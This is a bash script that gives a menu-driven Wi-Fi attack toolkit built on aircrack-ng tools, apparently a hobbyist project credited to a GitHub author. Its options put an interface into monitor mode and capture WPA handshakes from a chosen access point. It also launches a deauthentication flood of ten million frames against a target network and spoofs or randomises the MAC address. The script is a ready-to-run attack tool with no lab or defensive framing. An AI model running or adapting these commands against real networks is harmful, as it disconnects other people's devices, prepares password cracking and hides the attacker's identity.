#!/bin/bash
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
clear 
 

echo "░██╗░░░░░░░██╗██╗███████╗██╗░░░░██╗░█████╗░░█████╗░███╗░░██╗████████╗██████╗░░█████╗░██╗░░░░░"; sleep 0.5
echo "░██║░░██╗░░██║██║██╔════╝██║░░░██╔╝██╔══██╗██╔══██╗████╗░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░"; sleep 0.5
echo "░╚██╗████╗██╔╝██║█████╗░░██║░░██╔╝░██║░░╚═╝██║░░██║██╔██╗██║░░░██║░░░██████╔╝██║░░██║██║░░░░░"; sleep 0.5
echo "░░████╔═████║░██║██╔══╝░░██║░██╔╝░░██║░░██╗██║░░██║██║╚████║░░░██║░░░██╔══██╗██║░░██║██║░░░░░"; sleep 0.5
echo "░░╚██╔╝░╚██╔╝░██║██║░░░░░██║██╔╝░░░╚█████╔╝╚█████╔╝██║░╚███║░░░██║░░░██║░░██║╚█████╔╝███████╗"; sleep 0.5
echo "░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚════╝░░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝"; sleep 0.5
echo 
echo "my github https://github.com/moemenkali"; sleep 0.9
echo
          echo "<1> monitor"
echo 
          echo "<2> managed"
echo 
          echo "<3> monitor all the AP" 
echo 
          echo "<4> monitor single AP"
echo
          echo "<5> deauthenticate"
echo 
          echo "<6> mac changer" 
echo  
read -p "Choose from options >> " choose
echo 
echo "<Starting up>"; sleep 1
if [ $choose -eq 1 ]
then 
clear

echo "███╗░░░███╗░█████╗░███╗░░██╗██╗████████╗░█████╗░██████╗░"; sleep 0.3
echo "████╗░████║██╔══██╗████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗"; sleep 0.3
echo "██╔████╔██║██║░░██║██╔██╗██║██║░░░██║░░░██║░░██║██████╔╝"; sleep 0.3
echo "██║╚██╔╝██║██║░░██║██║╚████║██║░░░██║░░░██║░░██║██╔══██╗"; sleep 0.3
echo "██║░╚═╝░██║╚█████╔╝██║░╚███║██║░░░██║░░░╚█████╔╝██║░░██║"; sleep 0.3
echo "╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝"; sleep 0.3

ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig
aireplay-ng --test wlan0
echo 
echo "monitor mode is up now enjoy! :)"
clear
 fi




if [ $choose -eq 2 ]
then

clear
 echo "███╗░░░███╗░█████╗░███╗░░██╗░█████╗░░██████╗░███████╗██████╗░"; sleep 0.2
 echo "████╗░████║██╔══██╗████╗░██║██╔══██╗██╔════╝░██╔════╝██╔══██╗"; sleep 0.2
 echo "██╔████╔██║███████║██╔██╗██║███████║██║░░██╗░█████╗░░██║░░██║"; sleep 0.2
 echo "██║╚██╔╝██║██╔══██║██║╚████║██╔══██║██║░░╚██╗██╔══╝░░██║░░██║"; sleep 0.2
 echo "██║░╚═╝░██║██║░░██║██║░╚███║██║░░██║╚██████╔╝███████╗██████╔╝"; sleep 0.2
 echo "╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚═════╝░"; sleep 0.2
 echo 

ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode managed
ifconfig wlan0 up
service NetworkManager restart
iwconfig
echo
echo "managed mod is up enjoy! :)"
 fi

if [ $choose -eq 4 ]
then 
clear
#!/bin/bash
        echo "██╗░░██╗░█████╗░███╗░░██╗██████╗░░██████╗██╗░░██╗░█████╗░██╗░░██╗███████╗"; sleep 0.2
        echo "██║░░██║██╔══██╗████╗░██║██╔══██╗██╔════╝██║░░██║██╔══██╗██║░██╔╝██╔════╝"; sleep 0.2
        echo "███████║███████║██╔██╗██║██║░░██║╚█████╗░███████║███████║█████═╝░█████╗░░"; sleep 0.2
        echo "██╔══██║██╔══██║██║╚████║██║░░██║░╚═══██╗██╔══██║██╔══██║██╔═██╗░██╔══╝░░"; sleep 0.2
        echo "██║░░██║██║░░██║██║░╚███║██████╔╝██████╔╝██║░░██║██║░░██║██║░╚██╗███████╗"; sleep 0.2
        echo "╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝"; sleep 0.2
echo 
iwconfig
echo 
read -p "enter your interface (wlan0,wlan0mon) :>" wlan
echo 
read -p "but the bssid (mac adress):>" mac
echo 
read -p "but the channel:>" ch
echo 
read -p "but the name of the handshak:>" name
clear
airodump-ng --bssid $mac --channel $ch --write $name $wlan
  fi
  
  
if [ $choose -eq 3 ]
then
clear 
iwconfig
 
echo  
read -p "enter your interface (wlan0,wlan0mon) :>" enter
clear 
airodump-ng $enter 

fi

 
if [ $choose -eq 5 ]
then 
clear
iwconfig
echo
echo "============================================"
read -p "enter your interface (wlan0,wlan0mon) :>" wlan
echo "============================================"
echo 
echo "=============="
read -p "mac adress" en
echo "=============="
echo 
echo "==========="
read -p "channle" ch
echo "==========="
clear
iwconfig wlan0 channel $ch
aireplay-ng --deauth 10000000 -a $en $wlan
fi
if [ $choose -eq 6 ]
then 
clear
echo "<1>Print the MAC adress:>"
echo 
echo "<2>Set fully random MAC:>"
echo 
echo "<3>Reset to original:>"
echo 
echo "<4>mac changer manual"
echo 
read -p "Choose from options >> " choose 
echo 
if [ $choose -eq 1 ]
then
clear
iwconfig
read -p "enter your interface (wlan0,wlan0mon) :>" wlan
macchanger --show $wlan
  fi
  
if [ $choose -eq 2 ]
then
clear
iwconfig
read -p "enter your interface (wlan0,wlan0mon) :>" wlan
ifconfig $wlan down
macchanger --random $wlan
ifconfig $wlan up
macchanger --show $wlan
  fi
if [ $choose -eq 3 ]
then
clear
iwconfig
read -p "enter your interface (wlan0,wlan0mon) :>" wlan 
ifconfig $wlan down
sudo macchanger  --permanent $wlan
ifconfig $wlan up
fi
 
if [ $choose -eq 4 ]
then 
clear
iwconfig
read -p "enter your interface (wlan0,wlan0mon) :>" wlan
echo 
ifconfig $wlan down
read -p "enter the mac :>" mac
ifconfig $wlan hw ether $mac
ifconfig $wlan up
macchanger --show $wlan
fi

fi

echo 
echo
        echo "╔──────────────────────────────────────────────╗"; sleep 0.5
        echo "|              <Mad by Moemen_N7>              |"; sleep 0.5
        echo "|         https://github.com/moemenkali        |"; sleep 0.5
        echo "┖──────────────────────────────────────────────┙"; sleep 0.5
